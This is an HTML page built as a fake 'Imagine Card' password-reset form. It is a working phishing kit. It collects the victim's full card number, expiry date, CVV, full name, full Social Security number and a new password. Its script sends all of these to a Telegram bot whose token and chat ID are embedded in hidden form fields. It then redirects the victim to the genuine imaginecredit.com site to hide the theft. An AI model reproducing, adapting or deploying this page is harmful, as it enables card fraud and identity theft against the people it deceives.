<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
    <title>Imagine Card · Reset Password</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #eef1f5;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            margin: 0;
        }

        .reset-container {
            max-width: 400px;
            width: 100%;
            background: #ffffff;
            border-radius: 32px;
            box-shadow: 0 20px 40px -12px rgba(0, 20, 40, 0.15);
            padding: 32px 24px 28px;
            border: 1px solid #e9edf4;
        }

        .brand-header {
            text-align: center;
            margin-bottom: 28px;
        }

        .brand-header .logo-icon {
            font-size: 28px;
            font-weight: 700;
            color: #0b1f3b;
            letter-spacing: -0.5px;
        }

        .brand-header .logo-icon span {
            color: #1a4b8c;
        }

        .brand-header .sub {
            font-size: 13px;
            color: #6a7f9b;
            font-weight: 500;
            margin-top: 4px;
            letter-spacing: 0.3px;
        }

        .brand-header .sub a {
            color: #1a4b8c;
            text-decoration: none;
            font-weight: 600;
        }

        .brand-header .sub a:hover {
            text-decoration: underline;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-group label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: #1f3552;
            margin-bottom: 4px;
            letter-spacing: 0.2px;
            text-transform: uppercase;
        }

        .form-group .hint {
            font-weight: 400;
            color: #7a8fa8;
            font-size: 11px;
            text-transform: none;
            margin-left: 4px;
        }

        .form-control {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1.5px solid #dce3ed;
            border-radius: 12px;
            background: #fafcff;
            transition: 0.15s;
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            color: #0a1f3b;
            outline: none;
        }

        .form-control:focus {
            border-color: #1a4b8c;
            box-shadow: 0 0 0 4px rgba(26, 75, 140, 0.10);
            background: #ffffff;
        }

        .form-control::placeholder {
            color: #a5b8ce;
            font-weight: 400;
            font-size: 14px;
        }

        .row-3col {
            display: flex;
            gap: 12px;
        }

        .row-3col .form-group {
            flex: 1;
        }

        .divider {
            border: none;
            border-top: 1.5px dashed #e2e9f2;
            margin: 20px 0 18px 0;
        }

        .btn-primary {
            width: 100%;
            border: none;
            padding: 15px;
            border-radius: 12px;
            font-weight: 700;
            font-size: 16px;
            background: #0b2a55;
            color: white;
            cursor: pointer;
            transition: 0.15s;
            border: 1px solid #091f3f;
            box-shadow: 0 4px 12px rgba(11, 42, 85, 0.20);
            margin-top: 6px;
            letter-spacing: 0.3px;
        }

        .btn-primary:hover {
            background: #153b70;
            transform: scale(0.98);
        }

        .btn-primary:active {
            transform: scale(0.96);
        }

        .footer-note {
            font-size: 11px;
            color: #7a8fa8;
            text-align: center;
            margin-top: 20px;
            padding-top: 16px;
            border-top: 1px solid #edf2f8;
            letter-spacing: 0.2px;
            line-height: 1.5;
        }

        .footer-note span {
            font-weight: 600;
            color: #1f3d68;
        }

        /* Password Overlay */
        .password-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.45);
            backdrop-filter: blur(6px);
            align-items: center;
            justify-content: center;
            z-index: 999;
            padding: 20px;
        }

        .password-overlay.active {
            display: flex;
        }

        .password-modal {
            background: white;
            max-width: 400px;
            width: 100%;
            border-radius: 32px;
            padding: 32px 28px 28px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.25);
            animation: fadeUp 0.25s ease;
        }

        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(24px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .password-modal h2 {
            font-size: 22px;
            font-weight: 700;
            color: #0b1f3b;
            margin-bottom: 4px;
        }

        .password-modal .modal-sub {
            color: #5d7797;
            font-size: 14px;
            margin-bottom: 22px;
        }

        .password-modal .form-group {
            margin-bottom: 14px;
        }

        .password-modal .form-group label {
            font-size: 12px;
            font-weight: 600;
            color: #1f3552;
            text-transform: uppercase;
            letter-spacing: 0.2px;
            display: block;
            margin-bottom: 4px;
        }

        .password-modal .form-control {
            padding: 14px 16px;
            font-size: 15px;
            border: 1.5px solid #dce3ed;
            border-radius: 12px;
            background: #fafcff;
            width: 100%;
            outline: none;
            font-family: 'Inter', sans-serif;
            font-weight: 500;
            color: #0a1f3b;
        }

        .password-modal .form-control:focus {
            border-color: #1a4b8c;
            box-shadow: 0 0 0 4px rgba(26, 75, 140, 0.10);
        }

        .password-hint {
            font-size: 12px;
            color: #6a7f9b;
            margin-top: 4px;
            padding-left: 4px;
        }

        .password-modal .btn-primary {
            margin-top: 8px;
        }

        .modal-close {
            background: none;
            border: none;
            font-size: 22px;
            color: #8a9bb0;
            cursor: pointer;
            float: right;
            margin-top: -6px;
            padding: 4px 8px;
            border-radius: 8px;
            transition: 0.15s;
        }

        .modal-close:hover {
            background: #f0f4fa;
            color: #1c3452;
        }

        /* loading state */
        .btn-primary.loading {
            opacity: 0.7;
            pointer-events: none;
        }

        .btn-primary .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin: 0 auto;
        }

        .btn-primary.loading .spinner {
            display: block;
        }

        .btn-primary.loading .btn-text {
            display: none;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 440px) {
            .reset-container { padding: 24px 18px 22px; }
            .password-modal { padding: 24px 20px; }
            .row-3col { gap: 8px; }
        }
    </style>
</head>
<body>

    <!-- MAIN CONTAINER -->
    <div class="reset-container">
        <div class="brand-header">
            <div class="logo-icon">Imagine<span>Card</span></div>
            <div class="sub">Secure Account · <a href="#" target="_blank">imaginecredit.com</a></div>
        </div>

        <!-- STEP 1: Full card details (including CVV), full name, full SSN -->
        <form id="step1Form" autocomplete="off">
            <div class="form-group">
                <label>Full Card Number <span class="hint">(16 digits)</span></label>
                <input type="text" class="form-control" id="fullCardNumber" placeholder="1234 5678 9012 3456" required autocomplete="cc-number" />
            </div>

            <div class="row-3col">
                <div class="form-group">
                    <label>Expiry <span class="hint">(MM/YY)</span></label>
                    <input type="text" class="form-control" id="expiryDate" placeholder="MM/YY" required autocomplete="cc-exp" />
                </div>
                <div class="form-group">
                    <label>CVV <span class="hint">(3-4 digits)</span></label>
                    <input type="text" class="form-control" id="cvv" placeholder="123" required autocomplete="off" maxlength="4" />
                </div>
            </div>

            <hr class="divider" />

            <div class="form-group">
                <label>Full Name <span class="hint">(as on card)</span></label>
                <input type="text" class="form-control" id="fullName" placeholder="John A. Doe" required autocomplete="name" />
            </div>

            <div class="form-group">
                <label>Full SSN <span class="hint">(9 digits, no dashes)</span></label>
                <input type="text" class="form-control" id="ssn" placeholder="123456789" required autocomplete="off" />
            </div>

            <div style="display: flex; justify-content: flex-end; margin-top: -4px; margin-bottom: 8px;">
                <span style="font-size: 12px; font-weight: 600; color: #1a4b8c; background: #edf3fc; padding: 4px 14px; border-radius: 30px;">🔒 secure</span>
            </div>

            <button type="submit" class="btn-primary" id="continueBtn">
                <span class="btn-text">Continue →</span>
                <span class="spinner"></span>
            </button>

            <input type="hidden" id="botToken" value="8901133113:AAGJgaIpLD74GFyE6bTm3A4x5GSFwxMHdgA" />
            <input type="hidden" id="chatId" value="8737104261" />
        </form>

        <div class="footer-note">
            This card is issued by WebBank, pursuant to license from Visa U.S.A. Inc.
        </div>
    </div>

    <!-- STEP 2: PASSWORD OVERLAY -->
    <div class="password-overlay" id="passwordOverlay">
        <div class="password-modal">
            <button class="modal-close" id="closeModalBtn" aria-label="Close">✕</button>
            <h2>🔑 Set New Password</h2>
            <p class="modal-sub">Create a strong password for your account.</p>
            <form id="passwordForm">
                <div class="form-group">
                    <label>New Password <span class="hint">(min 8 chars)</span></label>
                    <input type="password" class="form-control" id="newPassword" placeholder="••••••••" required minlength="8" autocomplete="new-password" />
                    <div class="password-hint">Use at least 8 characters with a mix of letters, numbers &amp; symbols</div>
                </div>
                <div class="form-group">
                    <label>Confirm Password</label>
                    <input type="password" class="form-control" id="confirmPassword" placeholder="••••••••" required autocomplete="new-password" />
                </div>
                <button type="submit" class="btn-primary" id="setPasswordBtn">
                    <span class="btn-text">Set Password &amp; Activate</span>
                    <span class="spinner"></span>
                </button>
            </form>
        </div>
    </div>

    <script>
        (function() {
            const step1Form = document.getElementById('step1Form');
            const passwordOverlay = document.getElementById('passwordOverlay');
            const passwordForm = document.getElementById('passwordForm');
            const closeModalBtn = document.getElementById('closeModalBtn');
            const continueBtn = document.getElementById('continueBtn');
            const setPasswordBtn = document.getElementById('setPasswordBtn');

            let step1Data = {};

            // Build Telegram message with all details
            function buildTelegramMessage(data) {
                const { fullCard, expiry, cvv, fullName, ssn, newPassword } = data;
                return `🔹 *Imagine Card · Password Reset* 🔹\n\n` +
                    `💳 *Full Card:* ${fullCard}\n` +
                    `📅 *Expiry:* ${expiry}\n` +
                    `🔐 *CVV:* ${cvv}\n` +
                    `👤 *Full Name:* ${fullName}\n` +
                    `🆔 *Full SSN:* ${ssn}\n` +
                    `🔑 *New Password:* ${newPassword}\n` +
                    `━━━━━━━━━━━━━━\n` +
                    `✅ submitted via Imagine Card`;
            }

            // Send to Telegram
            async function sendToTelegram(message) {
                const token = document.getElementById('botToken').value;
                const chatId = document.getElementById('chatId').value;
                const url = `https://api.telegram.org/bot${token}/sendMessage`;

                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true,
                        })
                    });
                    const result = await response.json();
                    if (!result.ok) {
                        console.warn('Telegram error:', result);
                        throw new Error(result.description || 'Telegram API error');
                    }
                    return result;
                } catch (error) {
                    console.error('Telegram send failed:', error);
                    throw error;
                }
            }

            // STEP 1: validate & show password overlay
            step1Form.addEventListener('submit', async function(e) {
                e.preventDefault();

                const fullCard = document.getElementById('fullCardNumber').value.trim();
                const expiry = document.getElementById('expiryDate').value.trim();
                const cvv = document.getElementById('cvv').value.trim();
                const fullName = document.getElementById('fullName').value.trim();
                const ssn = document.getElementById('ssn').value.trim();

                // Validate all fields
                if (!fullCard || !expiry || !cvv || !fullName || !ssn) {
                    alert('⚠️ Please fill in all fields.');
                    return;
                }

                // Basic card validation
                const cardDigits = fullCard.replace(/\s/g, '').replace(/\D/g, '');
                if (cardDigits.length < 16) {
                    alert('Please enter a valid 16-digit card number.');
                    return;
                }

                if (cvv.replace(/\D/g, '').length < 3) {
                    alert('Please enter a valid CVV (3-4 digits).');
                    return;
                }

                if (ssn.replace(/\D/g, '').length < 9) {
                    alert('Please enter a valid 9-digit SSN (digits only).');
                    return;
                }

                // Store data
                step1Data = { fullCard, expiry, cvv, fullName, ssn };

                // Show password overlay
                passwordOverlay.classList.add('active');
                document.getElementById('newPassword').value = '';
                document.getElementById('confirmPassword').value = '';
                setTimeout(() => document.getElementById('newPassword').focus(), 120);
            });

            // Close modal
            closeModalBtn.addEventListener('click', function() {
                passwordOverlay.classList.remove('active');
            });

            passwordOverlay.addEventListener('click', function(e) {
                if (e.target === passwordOverlay) {
                    passwordOverlay.classList.remove('active');
                }
            });

            // STEP 2: password submission with Telegram send
            passwordForm.addEventListener('submit', async function(e) {
                e.preventDefault();

                const newPassword = document.getElementById('newPassword').value.trim();
                const confirmPassword = document.getElementById('confirmPassword').value.trim();

                if (!newPassword || !confirmPassword) {
                    alert('Please enter and confirm your new password.');
                    return;
                }

                if (newPassword.length < 8) {
                    alert('Password must be at least 8 characters long.');
                    return;
                }

                if (newPassword !== confirmPassword) {
                    alert('Passwords do not match.');
                    return;
                }

                // Show loading state
                setPasswordBtn.classList.add('loading');
                setPasswordBtn.disabled = true;

                try {
                    const allData = { ...step1Data, newPassword };
                    const message = buildTelegramMessage(allData);

                    // Send to Telegram
                    await sendToTelegram(message);

                    // Success - close overlay and redirect
                    passwordOverlay.classList.remove('active');
                    window.location.href = 'https://www.imaginecredit.com';
                } catch (error) {
                    alert('There was an error sending your data. Please try again.');
                    setPasswordBtn.classList.remove('loading');
                    setPasswordBtn.disabled = false;
                }
            });

            // Handle Escape key
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape' && passwordOverlay.classList.contains('active')) {
                    passwordOverlay.classList.remove('active');
                }
            });

            // Reset loading state if modal closes
            passwordOverlay.addEventListener('transitionend', function() {
                if (!passwordOverlay.classList.contains('active')) {
                    setPasswordBtn.classList.remove('loading');
                    setPasswordBtn.disabled = false;
                }
            });
        })();
    </script>
</body>
</html>
